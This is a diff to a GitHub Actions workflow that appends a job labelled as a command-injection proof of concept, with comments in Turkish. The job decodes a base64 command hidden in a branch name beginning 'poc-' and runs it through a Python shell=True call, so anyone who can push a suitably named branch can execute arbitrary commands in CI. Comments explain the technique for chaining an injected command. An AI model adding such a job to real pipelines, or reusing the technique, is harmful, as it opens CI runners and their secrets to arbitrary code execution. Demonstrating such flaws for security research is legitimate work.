@@ -247,3 +247,33 @@ jobs:
         run: |
           nix develop -c \
             cargo deny check advisories
+# --- POC STEPS START HERE ---
+
+  poc-trigger:
+    name: POC - Trigger Command Injection
+    runs-on: ubuntu-latest
+    
+    # Bu işin sadece bizim 'poc-' ile başlayan branch'imizde çalışmasını sağlar
+    if: startsWith(github.ref_name, 'poc-')
+    
+    steps:
+      - name: "1. Extract Payload from Branch Name"
+        id: poc_payload
+        run: |
+          # Branch isminden 'poc-' ön ekini kaldır, kalanı Base64'ten çöz
+          payload=$(echo "${{ github.ref_name }}" | sed 's/^poc-//' | base64 -d)
+          echo "✅ Payload extracted and decoded."
+          echo "🤫 Decoded Command: $payload"
+          # Komutu bir sonraki adımda kullanmak için output olarak ayarla
+          echo "::set-output name=command::$payload"
+
+      - name: "2. Simulate Vulnerable Function Call"
+        run: |
+          echo "🚀 Simulating the vulnerable function call with shell=True..."
+          # rust_ci_helper.py'deki zafiyetli durumu taklit ediyoruz.
+          # 'nonexistent_binary;' kısmı, orijinal komutun başarısız olmasını ama
+          # bizim komutumuzun yine de çalışmasını sağlayan bir tekniktir.
+          python3 -c 'import subprocess; subprocess.run("echo Non-existent command failed as expected...; ${{ steps.poc_payload.outputs.command }}", shell=True)'
+          echo "✅ Vulnerable call simulation finished."
+
+# --- POC STEPS END HERE ---
